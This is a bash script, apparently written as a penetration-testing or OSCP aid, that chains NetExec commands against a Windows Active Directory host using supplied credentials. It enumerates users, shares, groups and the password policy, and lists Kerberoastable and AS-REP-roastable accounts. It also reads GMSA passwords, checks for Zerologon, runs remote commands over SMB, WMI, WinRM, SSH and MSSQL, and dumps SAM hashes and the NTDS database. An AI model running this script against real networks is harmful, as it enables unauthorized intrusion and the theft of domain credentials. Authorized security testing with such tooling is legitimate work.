#!/bin/bash

# Check the number of arguments
if [ "$#" -ne 4 ]; then
    echo "Usage: ./nxc-auto.sh [IP] [USER] [PASSWD] [DOMAIN]"
    exit 1
fi


IP=$1
user=$2
pass=$3
domain=$4

HEADER='\033[95m'
OKBLUE='\033[94m'
OKCYAN='\033[96m'
OKGREEN='\033[92m'
WARNING='\033[93m'
FAIL='\033[91m'
ENDC='\033[0m'
BOLD='\033[1m'
UNDERLINE='\033[4m'

echo -e "\n\033[96m[+] Logging Enabled:\033[0m `pwd`/nxc-enum\n"
mkdir -p nxc-enum nxc-enum/smb nxc-enum/ldap

echo -e "\n\033[96m[+] OS info, Name, Domain, SMB versions\033[0m\n"
# checks if the SMB service is running; returns OS info, name, domain, SMB versions
unbuffer nxc ldap $IP -u $user -p $pass --get-sid --users | tee nxc-enum/ldap/domain-sid.txt # Domain SID

echo -e "\n\033[96m[+] Checking Guest access\033[0m\n"
nxc smb $IP -d $domain -u 'guest' -p '' # check for guest access

echo -e "\n\033[96m[+] Checking Anonymous access\033[0m\n"
nxc smb $IP -d $domain -u '' -p '' # check for anonymous access
nxc smb $IP -d $domain -u 'user.d0es.n0t.eXist' -p ''

echo -e "\n\033[96m[+] Validating credentials\033[0m\n"
nxc smb $IP -d $domain -u $user -p $pass # Validate a  username and password against the SMB
nxc ldap $IP -d $domain -u $user -p $pass # LDAP
nxc winrm $IP -d $domain -u $user -p $pass # WinRM
nxc rpc $IP -d $domain -u $user -p $pass # RPC
nxc mssql $IP -u $user -p $pass # MSSQL
nxc ssh $IP -u $user -p $pass # SSH
nxc ftp $IP -u $user -p $pass # FTP
nxc vnc $IP -u $user -p $pass # VNC
# nxc rdp $IP -u $user -p $pass # RDP
# nxc ftp $IP -u $user -p $pass # FTP

echo -e "\n\033[96m[+] Listing shared directories\033[0m\n"
unbuffer nxc smb $IP -u $user -p $pass --shares | tee nxc-enum/smb/shares.txt # List shared directories on the target machine

echo -e "\n\033[96m[+] Enumerating domain users\033[0m\n"
unbuffer nxc smb $IP -u $user -p $pass --users | tee nxc-enum/smb/users.txt # Enumerate domain users / logged-on users on the target machine
unbuffer nxc ldap $IP -u $user -p $pass --users --active-users | tee nxc-enum/ldap/active-users.txt

echo -e "\n\033[96m[+] Enumerating logged users\033[0m\n"
unbuffer nxc smb $IP -u $user -p $pass --loggedon-users | tee nxc-enum/smb/logged-users.txt

echo -e "\n\033[96m[+] Enumerating Admin users\033[0m\n"
unbuffer nxc ldap $IP -u $user -p $pass --users --admin-count | tee nxc-enum/ldap/admin-count-users.txt

echo -e "\n\033[96m[+] Enumerating domain users by bruteforcing RID\033[0m\n"
unbuffer nxc smb $IP -u $user -p $pass --rid-brute | tee nxc-enum/smb/rid-bruteforce.txt # enumerate users by bruteforcing RID's 

echo -e "\n\033[96m[+] Enumerating domain groups\033[0m\n"
unbuffer nxc smb $IP -u $user -p $pass --groups | tee nxc-enum/smb/domain-groups.txt # Enumerate domain / local groups on the target machine

echo -e "\n\033[96m[+] Enumerating local groups\033[0m\n"
unbuffer nxc smb $IP -u $user -p $pass --local-groups | tee nxc-enum/smb/local-groups.txt

echo -e "\n\033[96m[+] Dumping password policy\033[0m\n"
unbuffer nxc smb $IP -u $user -p $pass --pass-pol | tee nxc-enum/smb/pw-policy.txt # dump password policy of the domain

echo -e "\n\033[96m[+] Checking WinRM Access\033[0m\n"
nxc winrm $IP -u $user -p $pass # check if credentials can be used with winRM

echo -e "\n\033[96m[+] Trying to execute commands:\033[0m\n"
nxc smb $IP -u $user -p $pass -x whoami # check if commands can be run
nxc smb $IP -u $user -p $pass -X '$PSVersionTable' # check if powershell commands can be run
nxc wmi $IP -u $user -p $pass -x whoami # WMI
nxc winrm $IP -u $user -p $pass -x whoami # winRM

# Commented as it may be an auto-exploitation feature (OSCP exam)

# echo -e "\n\033[91m[+] Kerberoasting:\033[0m\n"
# nxc ldap $IP -u $user -p $pass --kerberoasting nxc-enum/ldap/kerberoasting.txt  

# echo -e "\n\033[91m[+] AS-REProasting:\033[0m\n"
# nxc ldap $IP -u users.txt -p $pass --asreproast nxc-enum/ldap/asreproasting.txt

# echo -e "\n\033[91m[+] Trusted for Delegation:\033[0m\n"
# unbuffer nxc ldap $IP -u $user -p $pass --trusted-for-delegation | tee nxc-enum/ldap/trusted-delegation.txt  

echo -e "\n\033[91m[+] GMSA Passwords:\033[0m\n"
unbuffer nxc ldap $IP -u $user -p $pass --users --gmsa | tee nxc-enum/ldap/gmsa.txt  

echo -e "\n\033[91m[+] Checking Anti Virus:\033[0m\n"
unbuffer nxc smb $IP -u $user -p $pass -M enum_av  | tee nxc-enum/ldap/anti_virus.txt  

echo -e "\n\033[96m[+] LDAP Module Enumeration:\033[0m"

echo -e "\n\033[91m[+] Machine Account Quota (maq)\033[0m\n"
unbuffer nxc ldap $IP -u $user -p $pass --users -M maq | tee nxc-enum/ldap/maq.txt # controls the number of computer accounts a user can create in the domain.

echo -e "\n\033[91m[+] ADCS Templates\033[0m\n"
unbuffer nxc ldap $IP -u $user -p $pass --users -M adcs | tee nxc-enum/ldap/adcs.txt # ADCS Enumeration

echo -e "\n\033[91m[+] User Description\033[0m\n"
unbuffer nxc ldap $IP -u $user -p $pass --users -M get-desc-users | tee nxc-enum/ldap/desc-users.txt # read user's description

echo -e "\n\033[91m[+] LDAP Checker\033[0m\n"
unbuffer nxc ldap $IP -u $user -p $pass --users -M ldap-checker | tee nxc-enum/ldap/ldap-checker.txt # verify if ldap require channel binding or not

echo -e "\n\033[91m[+] Password Not Required\033[0m\n"
unbuffer nxc ldap $IP -u $user -p $pass --users --password-not-required | tee nxc-enum/ldap/password-not-required.txt

echo -e "\n\033[91m[+] Trusted For Delegation\033[0m\n"
unbuffer nxc ldap $IP -u $user -p $pass --users --trusted-for-delegation | tee nxc-enum/ldap/trusted-for-delegation.txt

echo -e "\n\033[91m[+] Kerberoastable Users\033[0m\n"
unbuffer nxc ldap $IP -u $user -p $pass --users --kerberoastable | tee nxc-enum/ldap/kerberoastable.txt

echo -e "\n\033[91m[+] AS-REP Roastable Users\033[0m\n"
unbuffer nxc ldap $IP -u $user -p $pass --users --asreproastable | tee nxc-enum/ldap/asreproastable.txt

echo -e "\n\033[91m[+] Domain Controllers\033[0m\n"
unbuffer nxc ldap $IP -u $user -p $pass --dc-list | tee nxc-enum/ldap/domain-controllers.txt

echo -e "\n\033[96m[+] SMB Module Enumeration:\033[0m"

echo -e "\n\033[91m[+] Spider Plus (Find Interesting Files)\033[0m\n"
unbuffer nxc smb $IP -u $user -p $pass -M spider_plus | tee nxc-enum/smb/spider-plus.txt

echo -e "\n\033[91m[+] Enumerate LSASS Protection\033[0m\n"
unbuffer nxc smb $IP -u $user -p $pass -M enum_lsass | tee nxc-enum/smb/enum-lsass.txt

echo -e "\n\033[91m[+] Check Zerologon Vulnerability\033[0m\n"
unbuffer nxc smb $IP -u $user -p $pass -M zerologon | tee nxc-enum/smb/zerologon.txt

echo -e "\n\033[96m[+] MSSQL Enumeration:\033[0m"

echo -e "\n\033[91m[+] MSSQL Info\033[0m\n"
unbuffer nxc mssql $IP -u $user -p $pass | tee nxc-enum/smb/mssql-info.txt

echo -e "\n\033[91m[+] MSSQL Query (xp_dirtree)\033[0m\n"
unbuffer nxc mssql $IP -u $user -p $pass -x 'EXEC xp_dirtree "C:\\", 1;' | tee nxc-enum/smb/mssql-xp-dirtree.txt

echo -e "\n\033[91m[+] MSSQL Query (sp_databases)\033[0m\n"
unbuffer nxc mssql $IP -u $user -p $pass -x 'EXEC sp_databases;' | tee nxc-enum/smb/mssql-databases.txt

echo -e "\n\033[96m[+] SSH Enumeration:\033[0m"

echo -e "\n\033[91m[+] SSH Credentials Check\033[0m\n"
unbuffer nxc ssh $IP -u $user -p $pass | tee nxc-enum/smb/ssh-credentials.txt

echo -e "\n\033[91m[+] SSH Command Execution (whoami)\033[0m\n"
unbuffer nxc ssh $IP -u $user -p $pass -x whoami | tee nxc-enum/smb/ssh-whoami.txt

echo -e "\n\033[96m[+] FTP Enumeration:\033[0m"

echo -e "\n\033[91m[+] FTP Credentials Check\033[0m\n"
unbuffer nxc ftp $IP -u $user -p $pass | tee nxc-enum/smb/ftp-credentials.txt

echo -e "\n\033[91m[+] FTP Share Enumeration\033[0m\n"
unbuffer nxc ftp $IP -u $user -p $pass --shares | tee nxc-enum/smb/ftp-shares.txt

echo -e "\n\033[96m[+] VNC Enumeration:\033[0m"

echo -e "\n\033[91m[+] VNC Credentials Check\033[0m\n"
unbuffer nxc vnc $IP -u $user -p $pass | tee nxc-enum/smb/vnc-credentials.txt

echo -e "\n\033[96m[+] NFS Enumeration:\033[0m"

echo -e "\n\033[91m[+] NFS Share Enumeration\033[0m\n"
unbuffer nxc nfs $IP --shares | tee nxc-enum/smb/nfs-shares.txt

echo -e "\n\033[96m[+] WMI Enumeration:\033[0m"

echo -e "\n\033[91m[+] WMI Credentials Check\033[0m\n"
unbuffer nxc wmi $IP -u $user -p $pass | tee nxc-enum/smb/wmi-credentials.txt

echo -e "\n\033[91m[+] WMI Command Execution (whoami)\033[0m\n"
unbuffer nxc wmi $IP -u $user -p $pass -x whoami | tee nxc-enum/smb/wmi-whoami.txt

echo -e "\n\033[96m[+] SMB Additional Enumeration:\033[0m"

echo -e "\n\033[91m[+] SAM Hashes Dump\033[0m\n"
unbuffer nxc smb $IP -u $user -p $pass --sam | tee nxc-enum/smb/sam-hashes.txt

echo -e "\n\033[91m[+] NTDS Database Dump\033[0m\n"
unbuffer nxc smb $IP -u $user -p $pass --ntds | tee nxc-enum/smb/ntds-dump.txt

# Commented as it may be an auto-exploitation feature (OSCP exam)

# echo -e "\n\033[91m[+] Administrator's ACE\033[0m\n"
# unbuffer nxc ldap $IP -u $user -p $pass -M daclread -o TARGET=Administrator ACTION=read | tee nxc-enum/ldap/admin-ace.txt # Read all the ACEs of the Administrator

# echo -e "\n\033[91m[+] DCSync Rights\033[0m\n"
# nxc ldap $IP -u $user -p $pass -M daclread -o TARGET_DN="DC=lunar,DC=eruca,DC=com" ACTION=read RIGHTS=DCSync # principals that have DCSync rights